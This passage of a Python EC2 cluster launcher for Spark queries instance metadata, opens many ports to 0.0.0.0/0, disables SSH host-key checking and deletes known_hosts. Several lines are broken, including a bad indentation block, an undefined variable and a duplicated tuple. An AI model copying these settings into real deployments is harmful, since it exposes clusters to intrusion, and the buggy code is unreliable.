Spark version: {v}\".format(v=version), file=stderr)\n            sys.exit(1)\n        return version\n    else:\n        github_commit_url = \"{repo}/commit/{commit_hash}\".format(repo=repo, commit_hash=version)\n        request = Request(github_commit_url)\n        request.get_method = lambda: 'HEAD'\n        try:\n            response = urlopen(request)\n        except HTTPError as e:\n            print(\"Couldn't validate Spark commit: {url}\".format(url=github_commit_url),\n                  file=stderr)\n            print(\"Received HTTP response code of {code}.\".format(code=e.code), file=stderr)\n            sys.exit(1)\n        return version\n\nEC2_INSTANCE_TYPES = {\n  \"c1.medium\":   \"pvm\",\n  \"c1.xlarge\":   \"pvm\",\n  \"c3.large\":    \"pvm\",\n  \"c3.xlarge\":   \"pvm\",\n  \"c3.2xlarge\":  \"pvm\",\n  \"c3.4xlarge\":  \"pvm\",\n  \"c3.8xlarge\":  \"pvm\",\n  \"c4.large\":    \"hvm\",\n  \"c4.xlarge\":   \"hvm\",\n  \"c4.2xlarge\":  \"hvm\",\n  \"c4.4xlarge\":  \"hvm\",\n  \"c4.8xlarge\":  \"hvm\",\n  \"cc1.4xlarge\": \"hvm\",\n  \"cc2.8xlarge\": \"hvm\",\n  \"cg1.4xlarge\": \"hvm\",\n  \"cr1.8xlarge\": \"hvm\",\n  \"d2.xlarge\":   \"hvm\",\n  \"d2.2xlarge\":  \"hvm\",\n  \"d2.4xlarge\":  \"hvm\",\n  \"d2.8xlarge\":  \"hvm\",\n  \"g2.2xlarge\":  \"hvm\",\n  \"g2.8xlarge\":  \"hvm\",\n  \"hi1.4xlarge\": \"pvm\",\n  \"hs1.8xlarge\": \"pvm\",\n  \"i2.xlarge\":   \"hvm\",\n  \"i2.2xlarge\":  \"hvm\",\n  \"i2.4xlarge\":  \"hvm\",\n  \"i2.8xlarge\":  \"hvm\",\n  \"m1.small\":    \"pvm\",\n  \"m1.medium\":   \"pvm\",\n  \"m1.large\":    \"pvm\",\n  \"m1.xlarge\":   \"pvm\",\n  \"m2.xlarge\":   \"pvm\",\n  \"m2.2xlarge\":  \"pvm\",\n  \"m2.4xlarge\":  \"pvm\",\n  \"m3.medium\":   \"hvm\",\n  \"m3.large\":    \"hvm\",\n  \"m3.xlarge\":   \"hvm\",\n  \"m3.2xlarge\":  \"hvm\",\n  \"r3.large\":    \"hvm\",\n  \"r3.xlarge\":   \"hvm\",\n  \"r3.2xlarge\":  \"hvm\",\n  \"r3.4xlarge\":  \"hvm\",\n  \"r3.8xlarge\":  \"hvm\",\n  \"r4.large\":    \"hvm\",\n  \"r4.xlarge\":   \"hvm\",\n  \"r4.2xlarge\":  \"hvm\",\n  \"r4.4xlarge\":  \"hvm\",\n  \"r4.8xlarge\":  \"hvm\",\n  \"r4.16xlarge\": \"hvm\",\n  \"x1e.large\":   \"hvm\",\n  \"x1e.xlarge\":  \"hvm\",\n  \"x1e.2xlarge\": \"hvm\",\n  \"x1e.4xlarge\": \"hvm\",\n  \"x1e.8xlarge\": \"hvm\",\n  \"x1e.16xlarge\":\"hvm\",\n  \"x1e.32xlarge\":\"hvm\",\n  \"t1.micro\":    \"pvm\",\n  \"t2.micro\":    \"hvm\",\n  \"t2.small\":    \"hvm\",\n  \"t2.medium\":   \"hvm\",\n}\n\n\ndef get_tachyon_version(spark_version):\n  return SPARK_TACHYON_MAP.get(spark_version, \"\")\n\n\ndef get_spark_ami(opts):\n  if opts.instance_type in EC2_INSTANCE_TYPES:\n    instance_type = EC2_INSTANCE_TYPES[opts.instance_type]\n  else:\n    instance_type = \"pvm\"\n    print(\"Don't recognize %s, assuming type is pvm\" % opts.instance_type, file=stderr)\n\n  ami_prefix = \"{r}/{b}/ami-list\".format(\n    r=DEFAULT_SPARK_EC2_GITHUB_REPO.replace(\"https://github.com\", \"https://raw.github.com\", 1),\n    b=DEFAULT_SPARK_EC2_BRANCH)\n\n  ami_path = \"%s/%s/%s\" % (ami_prefix, opts.region, instance_type)\n  reader = codecs.getreader(\"ascii\")\n  try:\n    ami = reader(urlopen(ami_path)).read().strip()\n  except:\n    print(\"Could not resolve AMI at: \" + ami_path, file=stderr)\n    sys.exit(1)\n\n  print(\"Spark AMI: \" + ami)\n  return ami\n\ndef launch_cluster(conn, opts, cluster_name):\n\n  #Remove known hosts to avoid \"Offending key for IP...\" errors.\n  known_hosts = os.environ['HOME'] + \"/.ssh/known_hosts\"\n  if os.path.isfile(known_hosts):\n    os.remove(known_hosts)\n  if opts.key_pair is None:\n      opts.key_pair = keypair()\n      if opts.key_pair is None:\n        print ( \"ERROR: Must provide a key pair name (-k) to use on instances.\", file=sys.stderr)\n        sys.exit(1)\n\n  if opts.profile is None:\n    opts.profile = profile()\n    if opts.profile is None:\n      print ( \"ERROR: No profile found in current host. It be provided with -p option.\", file=sys.stderr)\n      sys.exit(1)\n\n  public_key = pub_key()\n  user_data = Template(\"\"\"#!/bin/bash\n  set -e -x\n  echo '$public_key' >> ~root/.ssh/authorized_keys\n  echo '$public_key' >> ~ec2-user/.ssh/authorized_keys\"\"\").substitute(public_key=public_key)\n\n  print(\"Setting up security groups...\")\n  master_group = get_or_make_group(conn, cluster_name + \"-master\")\n  slave_group = get_or_make_group(conn, cluster_name + \"-slaves\")\n\n  security_group = os.popen(\"curl -s http://169.254.169.254/latest/meta-data/security-groups\").read()\n\n  sparknotebook_group = get_or_make_group(conn, security_group)\n    master_group.authorize(src_group=master_group)\n    master_group.authorize(src_group=slave_group)\n    master_group.authorize(src_group=sparknotebook_group)\n    master_group.authorize('tcp', 22, 22, '0.0.0.0/0')\n    master_group.authorize('tcp', 8080, 8081, '0.0.0.0/0')\n    master_group.authorize('tcp', 18080, 18080, '0.0.0.0/0')\n    master_group.authorize('tcp', 19999, 19999, '0.0.0.0/0')\n    master_group.authorize('tcp', 50030, 50030, '0.0.0.0/0')\n    master_group.authorize('tcp', 50070, 50070, '0.0.0.0/0')\n    master_group.authorize('tcp', 60070, 60070, '0.0.0.0/0')\n    master_group.authorize('tcp', 4040, 4045, '0.0.0.0/0')\n    master_group.authorize('tcp', 7077, 7077, '0.0.0.0/0')\n    if opts.ganglia:\n      master_group.authorize('tcp', 5080, 5080, '0.0.0.0/0')\n    slave_group.authorize(src_group=master_group)\n    slave_group.authorize(src_group=slave_group)\n    slave_group.authorize(src_group=sparknotebook_group)\n    slave_group.authorize('tcp', 22, 22, '0.0.0.0/0')\n    slave_group.authorize('tcp', 8080, 8081, '0.0.0.0/0')\n    slave_group.authorize('tcp', 50060, 50060, '0.0.0.0/0')\n    slave_group.authorize('tcp', 50075, 50075, '0.0.0.0/0')\n    slave_group.authorize('tcp', 60060, 60060, '0.0.0.0/0')\n    slave_group.authorize('tcp', 60075, 60075, '0.0.0.0/0')\n\n  if not any(r for r in sparknotebook_group.rules for g in r.grants if master_group.id == g.group_id):\n    sparknotebook_group.authorize(ip_protocol=\"tcp\", from_port=\"1\", to_port=\"65535\", src_group=master_group)\n    sparknotebook_group.authorize(ip_protocol=\"icmp\", from_port=\"-1\", to_port=\"-1\", src_group=master_group)\n\n  if not any(r for r in sparknotebook_group.rules for g in r.grants if slave_group.id == g.group_id):\n    sparknotebook_group.authorize(ip_protocol=\"tcp\", from_port=\"1\", to_port=\"65535\", src_group=slave_group)\n    sparknotebook_group.authorize(ip_protocol=\"icmp\", from_port=\"-1\", to_port=\"-1\", src_group=slave_group)\n\n  existing_masters, existing_slaves = get_existing_cluster(conn, opts, cluster_name,\n                                                           die_on_error=False)\n  if existing_slaves or (existing_masters and not opts.use_existing_master):\n    print ((\"ERROR: There are already instances running in \" +\n        \"group %s or %s\" % (master_group.name, slave_group.name)), file=sys.stderr)\n    sys.exit(1)\n\n  # Figure out Spark AMI\n  if opts.ami is None:\n    opts.ami = get_spark_ami(opts)\n  print(\"Launching instances...\")\n\n  try:\n    image = conn.get_all_images(image_ids=[opts.ami])[0]\n  except:\n    print (\"Could not find AMI \" + opts.ami, file=sys.stderr)\n    sys.exit(1)\n\n  block_map = BlockDeviceMapping()\n  if opts.ebs_vol_size > 0:\n    device = EBSBlockDeviceType()\n    device.size = opts.ebs_vol_size\n    device.delete_on_termination = True\n    block_map[\"/dev/sdv\"] = device\n\n\n  if opts.instance_type.startswith('m3.'):\n    for i in range(get_num_disks(opts.instance_type)):\n      dev = BlockDeviceType()\n      dev.ephemeral_name = 'ephemeral%d' % i\n      # The first ephemeral drive is /dev/sdb.\n      name = '/dev/sd' + string.ascii_letters[i + 1]\n      block_map[name] = dev\n\n  if opts.spot_price!= None:\n    zones = get_zones(conn, opts)\n\n    num_zones = len(zones)\n    i = 0\n    my_req_ids = []\n\n    for zone in zones:\n      best_price = find_best_price(conn,opts.instance_type,zone, opts.spot_price)\n      print((\"Requesting %d slaves as spot instances with price $%.3f/hour each (total $%.3f/hour)\" %\n           (opts.slaves, best_price, opts.slaves * best_price)), file=sys.stderr)\n\n      num_slaves_this_zone = get_partition(opts.slaves, num_zones, i)\n      interface = boto.ec2.networkinterface.NetworkInterfaceSpecification(subnet_id=subnetId(), groups=[slave_group.id], associate_public_ip_address=True)\n      interfaces = boto.ec2.networkinterface.NetworkInterfaceCollection(interface)\n\n      slave_reqs = conn.request_spot_instances(\n          price = best_price,\n          image_id = opts.ami,\n          launch_group = \"launch-group-%s\" % cluster_name,\n          placement = zone,\n          count = num_slaves_this_zone,\n          key_name = opts.key_pair,\n          instance_type = opts.instance_type,\n          block_device_map = block_map,\n          user_data = user_data,\n          instance_profile_arn = opts.profile,\n          network_interfaces = interfaces)\n      my_req_ids += [req.id for req in slave_reqs]\n      i += 1\n\n    print (\"Waiting for spot instances to be granted\", file=sys.stderr)\n    try:\n      while True:\n        time.sleep(10)\n        reqs = conn.get_all_spot_instance_requests()\n        id_to_req = {}\n        for r in reqs:\n          id_to_req[r.id] = r\n        active_instance_ids = []\n        for i in my_req_ids:\n          if i in id_to_req and id_to_req[i].state == \"active\":\n            active_instance_ids.append(id_to_req[i].instance_id)\n        if len(active_instance_ids) == opts.slaves:\n          print (\"All %d slaves granted\" % opts.slaves, file=sys.stderr)\n          reservations = conn.get_all_instances(active_instance_ids)\n          slave_nodes = []\n          for r in reservations:\n            slave_nodes += r.instances\n          break\n        else:\n          # print >> stderr, \".\",\n          print(\"%d of %d slaves granted, waiting longer\" % (\n            len(active_instance_ids), opts.slaves))\n    except:\n      print(\"Canceling spot instance requests\", file=sys.stderr)\n      conn.cancel_spot_instance_requests(my_req_ids)\n      (master_nodes, slave_nodes) = get_existing_cluster(\n          conn, opts, cluster_name, die_on_error=False)\n      running = len(master_nodes) + len(slave_nodes)\n      if running:\n        print((\"WARNING: %d instances are still running\" % running), file=sys.stderr)\n      sys.exit(0)\n  else:\n    zones = get_zones(conn, opts)\n    num_zones = len(zones)\n    i = 0\n    slave_nodes = []\n    for zone in zones:\n      num_slaves_this_zone = get_partition(opts.slaves, num_zones, i)\n      if num_slaves_this_zone > 0:\n        slave_res = image.run(key_name = opts.key_pair,\n                              security_group_ids = [slave_group.id],\n                              instance_type = opts.instance_type,\n                              subnet_id = subnetId(),\n                              placement = zone,\n                              min_count = num_slaves_this_zone,\n                              max_count = num_slaves_this_zone,\n                              block_device_map = block_map,\n                              user_data = user_data,\n                              instance_profile_arn = opts.profile)\n        slave_nodes += slave_res.instances\n        print(\"Launched %d slaves in %s, regid = %s\" % (num_slaves_this_zone,\n                                                        zone, slave_res.id), file=sys.stderr)\n      i += 1\n\n  if existing_masters:\n    print(\"Starting master...\")\n    for inst in existing_masters:\n      if inst.state not in [\"shutting-down\", \"terminated\"]:\n        inst.start()\n    master_nodes = existing_masters\n  else:\n    master_type = opts.master_instance_type\n    if master_type == \"\":\n      master_type = opts.instance_type\n    if opts.zone == 'all':\n      opts.zone = random.choice(conn.get_all_zones()).name\n    if opts.spot_price!= None:\n      best_price = find_best_price(conn,master_type,opts.zone,opts.spot_price)\n      print((\"Requesting master as spot instances with price $%.3f/hour\" % (best_price)), file=sys.stderr)\n\n      interface = boto.ec2.networkinterface.NetworkInterfaceSpecification(subnet_id=subnetId(), groups=[master_group.id], associate_public_ip_address=True)\n      interfaces = boto.ec2.networkinterface.NetworkInterfaceCollection(interface)\n\n      master_reqs = conn.request_spot_instances(\n        price = best_price,\n        image_id = opts.ami,\n        launch_group = \"launch-group-%s\" % cluster_name,\n        placement = opts.zone,\n        count = 1,\n        key_name = opts.key_pair,\n        instance_type = master_type,\n        block_device_map = block_map,\n        user_data = user_data,\n        instance_profile_arn = opts.profile,\n        network_interfaces = interfaces)\n      my_req_ids = [r.id for r in master_reqs]\n      print(\"Waiting for spot instance to be granted\", file=sys.stderr)\n      try:\n        while True:\n          time.sleep(10)\n          reqs = conn.get_all_spot_instance_requests(request_ids=my_req_ids)\n          id_to_req = {}\n          for r in reqs:\n            id_to_req[r.id] = r\n          active_instance_ids = []\n          for i in my_req_ids:\n            #print(id_to_req[i].state, file=sys.stderr)\n            if i in id_to_req and id_to_req[i].state == \"active\":\n              active_instance_ids.append(id_to_req[i].instance_id)\n          if len(active_instance_ids) == 1:\n            print ( \"Master granted\", file=sys.stderr)\n            reservations = conn.get_all_instances(active_instance_ids)\n            master_nodes = []\n            for r in reservations:\n              master_nodes += r.instances\n            break\n          else:\n            # print >> stderr, \".\",\n            print(\"%d of %d masters granted, waiting longer\" % (\n              len(active_instance_ids), 1))\n      except:\n        print(\"Canceling spot instance requests\", file=sys.stderr)\n        conn.cancel_spot_instance_requests(my_req_ids)\n        (master_nodes, master_nodes) = get_existing_cluster(\n            conn, opts, cluster_name, die_on_error=False)\n        running = len(master_nodes) + len(master_nodes)\n        if running:\n          print((\"WARNING: %d instances are still running\" % running), file=sys.stderr)\n        sys.exit(0)\n    else:\n      master_res = image.run(key_name = opts.key_pair,\n                             security_group_ids = [master_group.id],\n                             instance_type = master_type,\n                             subnet_id = subnetId(),\n                             placement = opts.zone,\n                             min_count = 1,\n                             max_count = 1,\n                             block_device_map = block_map,\n                             user_data = user_data,\n                             instance_profile_arn = opts.profile)\n      master_nodes = master_res.instances\n      print(\"Launched master in %s, regid = %s\" % (zone, master_res.id), file=sys.stderr)\n  return (master_nodes, slave_nodes)\n\n\ndef get_existing_cluster(conn, opts, cluster_name, die_on_error=True):\n  print(\"Searching for existing cluster %s...\" % cluster_name, file=sys.stderr)\n  reservations = conn.get_all_instances()\n  master_nodes = []\n  slave_nodes = []\n  for res in reservations:\n    active = [i for i in res.instances if is_active(i)]\n    for inst in active:\n      group_names = [g.name for g in inst.groups]\n      if (cluster_name + \"-master\") in group_names:\n        master_nodes.append(inst)\n      elif (cluster_name + \"-slaves\") in group_names:\n        slave_nodes.append(inst)\n  if any((master_nodes, slave_nodes)):\n    print(\"Spark standalone cluster started at http://%s:8080\" % master_nodes[0].public_dns_name)\n    print(\"Spark private ip address %s\" % master_nodes[0].private_dns_name)\n    print(\"Spark standalone cluster started at http://%s:8080\" % master_nodes[0].public_dns_name, file=sys.stderr)\n    print((\"Found %d master(s), %d slaves\" %\n           (len(master_nodes), len(slave_nodes))), file=sys.stderr)\n    get_master_setup_files(master_nodes[0].private_dns_name, opts)\n    if opts.ganglia:\n      print(\"Ganglia started at http://%s:5080/ganglia\" % master_nodes[0].public_dns_name, file=sys.stderr)\n  if master_nodes!= [] or not die_on_error:\n    return (master_nodes, slave_nodes)\n  else:\n    if master_nodes == [] and slave_nodes!= []:\n      print(\"ERROR: Could not find master in group %s-master\" %cluster_name)\n    else:\n      print(\"ERROR: Could not find any existing cluster\")\n    sys.exit(1)\n\n\ndef setup_cluster(conn, master_nodes, slave_nodes, opts, deploy_ssh_key):\n\n  master_nodes[0].update()\n  master = master_nodes[0]\n  print (\"Spark private ip address %s\" % master.private_dns_name)\n  if deploy_ssh_key:\n    print(\"Generating cluster's SSH key on master...\")\n    key_setup = \"\"\"\n      [ -f ~/.ssh/id_rsa ] ||\n        (ssh-keygen -q -t rsa -N '' -f ~/.ssh/id_rsa &&\n         cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys)\n    \"\"\"\n    ssh(master.private_dns_name, opts, key_setup)\n    dot_ssh_tar = ssh_read(master.private_dns_name, opts, ['tar', 'c', '.ssh'])\n    print(\"Transferring cluster's SSH key to slaves...\", file=sys.stderr)\n    for slave in slave_nodes:\n      slave.update()\n      ssh_write(slave.private_dns_name, opts, ['tar', 'x'], dot_ssh_tar)\n\n\n  modules = ['mysql','spark', 'ephemeral-hdfs', 'persistent-hdfs',\n            'mapreduce','spark-standalone']\n\n  if opts.hadoop_major_version == \"1\":\n    modules = filter(lambda x: x!= \"mapreduce\", modules)\n\n  if opts.ganglia:\n    modules.append('ganglia')\n\n  ssh(\n    host=master.private_dns_name,\n    opts=opts,\n    command=\"rm -rf spark-ec2\"\n    + \" && \"\n    + \"git clone {r} -b {b} spark-ec2\".format(r=DEFAULT_SPARK_EC2_GITHUB_REPO, b=DEFAULT_SPARK_EC2_BRANCH)\n\n  )\n\n  print(\"Deploying files to master... \", file=sys.stderr)\n  (path, name) = os.path.split(__file__)\n  deploy_files(conn, path+\"/deploy.generic\", opts, master_nodes, slave_nodes, modules)\n\n  print(\"Running setup on master... \", file=sys.stderr)\n  setup_spark_cluster(master, opts)\n  get_master_setup_files(master.private_dns_name, opts)\n  print( stderr,\"Done!\", file=sys.stderr)\n\ndef get_master_setup_files(master, opts):\n  scp(master, opts, \"/root/spark/jars/datanucleus*.jar\", \"%s/lib\" % SPARK_EC2_DIR)\n  scp(master, opts, \"/root/spark/conf/*\", \"%s/conf\" % SPARK_EC2_DIR)\n\ndef setup_spark_cluster(master, opts):\n  ssh(master.private_dns_name, opts, \"chmod u+x spark-ec2/setup.sh\")\n  ssh(master.private_dns_name, opts, \"spark-ec2/setup.sh\")\n  master.update()\n  print(\"Spark standalone cluster started at http://%s:8080\" % master.public_dns_name)\n  print(\"Spark standalone cluster started at http://%s:8080\" % master.public_dns_name, file=sys.stderr)\n  if opts.ganglia:\n    print(\"Ganglia started at http://%s:5080/ganglia\" % master.public_dns_name, file=sys.stderr)\n\n\n\ndef wait_for_cluster(conn, wait_secs, master_nodes, slave_nodes):\n  print(\"Waiting for instances to start up...\", file=sys.stderr)\n  time.sleep(5)\n  wait_for_instances(conn, master_nodes)\n  wait_for_instances(conn, slave_nodes)\n\n\ndef wait_for_cluster_state(conn, opts, cluster_instances, cluster_state):\n  \"\"\"\n  Wait for all the instances in the cluster to reach a designated state.\n\n  cluster_instances: a list of boto.ec2.instance.Instance\n  cluster_state: a string representing the desired state of all the instances in the cluster\n         value can be'ssh-ready' or a valid value from boto.ec2.instance.InstanceState such as\n         'running', 'terminated', etc.\n         (would be nice to replace this with a proper enum: http://stackoverflow.com/a/1695250)\n  \"\"\"\n  sys.stdout.write(\n    \"Waiting for cluster to enter '{s}' state.\".format(s=cluster_state)\n  )\n  sys.stdout.flush()\n\n  start_time = datetime.now()\n  num_attempts = 0\n\n  while True:\n\n    for i in cluster_instances:\n      i.update()\n\n    statuses = conn.get_all_instance_status(instance_ids=[i.id for i in cluster_instances])\n\n    if cluster_state =='ssh-ready':\n      if all(i.state == 'running' for i in cluster_instances) and \\\n              all(s.system_status.status == 'ok' for s in statuses) and \\\n              all(s.instance_status.status == 'ok' for s in statuses) and \\\n              is_cluster_ssh_available(cluster_instances, opts):\n        break\n    else:\n      if all(i.state == cluster_state for i in cluster_instances):\n        break\n\n    num_attempts += 1\n\n    sys.stdout.write(\".\")\n    sys.stdout.flush()\n\n  sys.stdout.write(\"\\n\")\n\n  end_time = datetime.now()\n  print(\"Cluster is now in '{s}' state. Waited {t} seconds.\".format(\n    s=cluster_state,\n    t=(end_time - start_time).seconds\n  ))\n\ndef is_cluster_ssh_available(cluster_instances, opts):\n    \"\"\"\n    Check if SSH is available on all the instances in a cluster.\n    \"\"\"\n    for i in cluster_instances:\n        dns_name = i.private_dns_name\n        if not is_ssh_available(host=dns_name, opts=opts):\n            return False\n    else:\n        return True\n\ndef is_ssh_available(host, opts, print_ssh_output=True):\n    \"\"\"\n    Check if SSH is available on a host.\n    \"\"\"\n    s = subprocess.Popen(\n        ssh_command(opts) + ['-t', '-t', '-o', 'ConnectTimeout=3',\n                             '%s@%s' % (opts.user, host), stringify_command('true')],\n        stdout=subprocess.PIPE,\n    )\n\n    if s.returncode!= 0 and print_ssh_output:\n        print(textwrap.dedent(\"\"\"\\n\n            Warning: SSH connection error. (This could be temporary.)\n            Host: {h}\n            SSH return code: {r}\n            SSH output: {o}\n        \"\"\").format(\n            h=host,\n            r=s.returncode,\n            o=cmd_output.strip()\n        ))\n\n    return s.returncode == 0\n\ndef get_num_disks(instance_type):\n  disks_by_instance = {\n    \"c1.medium\":   1,\n    \"c1.xlarge\":   4,\n    \"c3.large\":    2,\n    \"c3.xlarge\":   2,\n    \"c3.2xlarge\":  2,\n    \"c3.4xlarge\":  2,\n    \"c3.8xlarge\":  2,\n    \"c4.large\":    0,\n    \"c4.xlarge\":   0,\n    \"c4.2xlarge\":  0,\n    \"c4.4xlarge\":  0,\n    \"c4.8xlarge\":  0,\n    \"cc1.4xlarge\": 2,\n    \"cc2.8xlarge\": 4,\n    \"cg1.4xlarge\": 2,\n    \"cr1.8xlarge\": 2,\n    \"d2.xlarge\":   3,\n    \"d2.2xlarge\":  6,\n    \"d2.4xlarge\":  12,\n    \"d2.8xlarge\":  24,\n    \"g2.2xlarge\":  1,\n    \"g2.8xlarge\":  2,\n    \"hi1.4xlarge\": 2,\n    \"hs1.8xlarge\": 24,\n    \"i2.xlarge\":   1,\n    \"i2.2xlarge\":  2,\n    \"i2.4xlarge\":  4,\n    \"i2.8xlarge\":  8,\n    \"m1.small\":    1,\n    \"m1.medium\":   1,\n    \"m1.large\":    2,\n    \"m1.xlarge\":   4,\n    \"m2.xlarge\":   1,\n    \"m2.2xlarge\":  1,\n    \"m2.4xlarge\":  2,\n    \"m3.medium\":   1,\n    \"m3.large\":    1,\n    \"m3.xlarge\":   2,\n    \"m3.2xlarge\":  2,\n    \"r3.large\":    1,\n    \"r3.xlarge\":   1,\n    \"r3.2xlarge\":  1,\n    \"r3.4xlarge\":  1,\n    \"r3.8xlarge\":  2,\n    \"r4.xlarge\":   1,\n    \"r4.2xlarge\":  1,\n    \"r4.4xlarge\":  1,\n    \"r4.8xlarge\":  1,\n    \"r4.16xlarge\": 1,\n    \"x1e.xlarge\":   1,\n    \"x1e.2xlarge\":  1,\n    \"x1e.4xlarge\":  1,\n    \"x1e.8xlarge\":  1,\n    \"x1e.16xlarge\": 1,\n    \"x1e.32xlarge\": 2,\n    \"t1.micro\":    0,\n    \"t2.micro\":    0,\n    \"t2.small\":    0,\n    \"t2.medium\":   0,\n  }\n  if instance_type in disks_by_instance:\n    return disks_by_instance[instance_type]\n  else:\n    print(\"WARNING: Don't know number of disks on instance type %s; assuming 1\"\n          % instance_type, file=stderr)\n    return 1\n\n\ndef deploy_files(conn, root_dir, opts, master_nodes, slave_nodes, modules):\n  active_master = master_nodes[0].private_dns_name\n\n  num_disks = get_num_disks(opts.instance_type)\n  hdfs_data_dirs = \"/mnt/ephemeral-hdfs/data\"\n  mapred_local_dirs = \"/mnt/hadoop/mrlocal\"\n  spark_local_dirs = \"/mnt/spark\"\n  if num_disks > 1:\n    for i in range(2, num_disks + 1):\n      hdfs_data_dirs += \",/mnt%d/ephemeral-hdfs/data\" % i\n      mapred_local_dirs += \",/mnt%d/hadoop/mrlocal\" % i\n      spark_local_dirs += \",/mnt%d/spark\" % i\n\n  cluster_url = \"%s:7077\" % active_master\n\n  if \".\" in opts.spark_version:\n    # Pre-built Spark deploy\n    spark_v = get_validate_spark_version(opts.spark_version, DEFAULT_SPARK_GITHUB_REPO)\n    tachyon_v = get_tachyon_version(spark_v)\n  else:\n    spark_v = \"%s|%s\" % (DEFAULT_SPARK_GITHUB_REPO, opts.spark_version)\n    tachyon_v = \"\"\n    print(\"Deploying Spark via git hash; Tachyon won't be set up\")\n    modules = filter(lambda x: x!= \"tachyon\", modules)\n\n  worker_instances_str = \"%d\" % opts.worker_instances if opts.worker_instances else \"\"\n  template_vars = {\n    \"master_list\": '\\n'.join([i.public_dns_name for i in master_nodes]),\n    \"active_master\": active_master,\n    \"slave_list\": '\\n'.join([i.public_dns_name for i in slave_nodes]),\n    \"cluster_url\": cluster_url,\n    \"hdfs_data_dirs\": hdfs_data_dirs,\n    \"mapred_local_dirs\": mapred_local_dirs,\n    \"spark_local_dirs\": spark_local_dirs,\n    \"swap\": str(opts.swap),\n    \"modules\": '\\n'.join(modules),\n    \"spark_version\": spark_v,\n    \"hadoop_major_version\": opts.hadoop_major_version,\n    \"metastore_user\": \"hive\",\n    \"metastore_passwd\": ''.join(random.SystemRandom().choice(string.uppercase + string.digits) for _ in xrange(10)),\n    \"spark_worker_instances\": worker_instances_str,\n    \"spark_master_opts\": opts.master_opts\n  }\n\n  print(root_dir)\n  tmp_dir = tempfile.mkdtemp()\n  for path, dirs, files in os.walk(root_dir):\n    if path.find(\".svn\") == -1:\n      dest_dir = os.path.join('/', path[len(root_dir):])\n      local_dir = tmp_dir + dest_dir\n      if not os.path.exists(local_dir):\n        os.makedirs(local_dir)\n      for filename in files:\n        if filename[0] not in '#.~' and filename[-1]!= '~':\n          dest_file = os.path.join(dest_dir, filename)\n          local_file = tmp_dir + dest_file\n          with open(os.path.join(path, filename)) as src:\n            with open(local_file, \"w\") as dest:\n              text = src.read()\n              for key in template_vars:\n                text = text.replace(\"{{\" + key + \"}}\", template_vars[key])\n              dest.write(text)\n              dest.close()\n  command = [\n      'rsync', '-rv',\n      '-e', stringify_command(ssh_command(opts)),\n      \"%s/\" % tmp_dir,\n      \"%s@%s:/\" % (opts.user, active_master)\n    ]\n  subprocess.check_call(command)\n  shutil.rmtree(tmp_dir)\n  print(tmp_dir)\n\n\ndef stringify_command(parts):\n  if isinstance(parts, str):\n    return parts\n  else:\n    return''.join(map(pipes.quote, parts))\n\n\ndef ssh_args(opts):\n  parts = ['-o', 'StrictHostKeyChecking=no', '-o LogLevel=error']\n  # parts += ['-i', '~/.ssh/id_rsa']\n  return parts\n\n\ndef ssh_command(opts):\n  return ['ssh'] + ssh_args(opts)\n\ndef scp_command(opts):\n  return ['scp'] + ssh_args(opts)\n\ndef pub_key():\n  key_gen = \"\"\"[ -f ~/.ssh/id_rsa ] ||\n        (ssh-keygen -q -t rsa -N '' -f ~/.ssh/id_rsa)\n  \"\"\"\n  subprocess.check_call(key_gen, shell=True)\n  return subprocess.Popen(\"cat ~/.ssh/id_rsa.pub\", shell=True, stdout=subprocess.PIPE).communicate()[0]\n\ndef profile():\n  return subprocess.Popen(\"\"\"curl -s http://169.254.169.254/latest/meta-data/iam/info | grep InstanceProfileArn\"\"\", shell=True, stdout=subprocess.PIPE).communicate()[0].split(\"\\\"\")[3]\n\ndef region():\n  return subprocess.Popen(\"\"\"curl -s http://169.254.169.254/latest/dynamic/instance-identity/document | grep region\"\"\", shell=True, stdout=subprocess.PIPE).communicate()[0].split(\"\\\"\")[3]\n\ndef zone():\n  return subprocess.Popen(\"\"\"curl -s http://169.254.169.254/latest/dynamic/instance-identity/document | grep availabilityZone\"\"\", shell=True, stdout=subprocess.PIPE).communicate()[0].split(\"\\\"\")[3]\n\ndef subnetId():\n  mac = subprocess.Popen(\"\"\"curl -s http://169.254.169.254/latest/meta-data/network/interfaces/macs/ | grep /\"\"\", shell=True, stdout=subprocess.PIPE).communicate()[0].split(\"/\")[0]\n  return subprocess.Popen(\"\"\"curl -s http://169.254.169.254/latest/meta-data/network/interfaces/macs/\"\"\" + mac + \"\"\"/subnet-id/\"\"\", shell=True, stdout=subprocess.PIPE).communicate()[0]\n\ndef keypair():\n    return subprocess.Popen(\"\"\"curl -s  http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key\"\"\", shell=True, stdout=subprocess.PIPE).communicate()[0].split(\" \")[2].strip()\n\ndef ssh(host, opts, command):\n  tries = 0\n  while True:\n    try:\n      return subprocess.check_call(\n        ssh_command(opts) + ['-t', '-t', '%s@%s' % (opts.user, host), stringify_command(command)])\n    except subprocess.CalledProcessError as e:\n      if (tries > 25):\n        print('Failed to SSH to remote host %s after %s retries.' % (host, tries), file=sys.stderr)\n        # If this was an ssh failure, provide the user with hints.\n        if e.returncode == 255:\n          raise UsageError('Failed to SSH to remote host %s.\\nPlease check that you have provided the correct --identity-file and --key-pair parameters and try again.' % (host))\n        else:\n          raise e\n      time.sleep(30)\n      tries = tries + 1\n\ndef scp(host, opts, src, target):\n  tries = 0\n  while True:\n    try:\n      return subprocess.check_call(\n        scp_command(opts) + ['%s@%s:%s' % (opts.user, host,src), target])\n    except subprocess.CalledProcessError as e:\n      if (tries > 25):\n        print(\"Failed to SCP to remote host {0} after r retries.\".format(host), file=sys.stderr)\n        # If this was an ssh failure, provide the user with hints.\n        if e.returncode == 255:\n          raise UsageError(\"Failed to SCP to remote host {0}.\\nPlease check that you have provided the correct --identity-file and --key-pair parameters and try again.\".format(host))\n        else:\n          raise e\n      time.sleep(30)\n      tries = tries + 1\n\n\ndef _check_output(*popenargs, **kwargs):\n    if'stdout' in kwargs:\n        raise ValueError('stdout argument not allowed, it will be overridden.')\n    process = subprocess.Popen(stdout=subprocess.PIPE, *popenargs, **kwargs)\n    output, unused_err = process.communicate()\n    retcode = process.poll()\n    if retcode:\n        cmd = kwargs.get(\"args\")\n        if cmd is None:\n            cmd = popenargs[0]\n        raise subprocess.CalledProcessError(retcode, cmd, output=output)\n    return output\n\n\ndef ssh_read(host, opts, command):\n  return _check_output(\n      ssh_command(opts) + ['%s@%s' % (opts.user, host), stringify_command(command)])\n\n\ndef ssh_write(host, opts, command, input):\n  tries = 0\n  while True:\n    proc = subprocess.Popen(\n        ssh_command(opts) + ['%s@%s' % (opts.user, host), stringify_command(command)],\n        